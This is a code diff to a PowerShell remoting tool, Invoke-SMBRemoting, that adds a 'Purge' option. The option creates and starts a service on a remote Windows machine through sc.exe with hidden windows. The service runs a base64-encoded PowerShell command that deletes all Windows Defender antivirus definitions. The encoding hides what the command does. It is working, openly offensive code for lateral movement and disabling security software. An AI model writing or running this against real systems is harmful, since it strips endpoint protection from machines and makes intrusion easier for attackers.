@@ -50,6 +50,7 @@ function Invoke-SMBRemoting {
 		[string]$Command,
 		[string]$Timeout = "30000",
 		[switch]$ModifyService,
+		[switch]$Purge,
 		[switch]$Verbose
 	)
 	
@@ -76,6 +77,24 @@ function Invoke-SMBRemoting {
 	
 	elseif(!$ServiceName -AND $ModifyService){
 		$ServiceName = "SensorService"
+	}
+	
+	if($Purge){
+		$arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc JgAgACcAQwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwBcAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAXABNAHAAQwBtAGQAUgB1AG4ALgBlAHgAZQAnACAALQBSAGUAbQBvAHYAZQBEAGUAZgBpAG4AaQB0AGkAbwBuAHMAIAAtAEEAbABsAA==`""
+	
+		$startarguments = "\\$ComputerName start $ServiceName"
+		
+		Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
+		
+		Start-Sleep -Milliseconds 1000
+		
+		Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
+		
+		Start-Sleep -Milliseconds 1000
+		
+		Write-Output "[+] Done!"
+		
+		break
 	}
 	
 	$ServerScript = @"
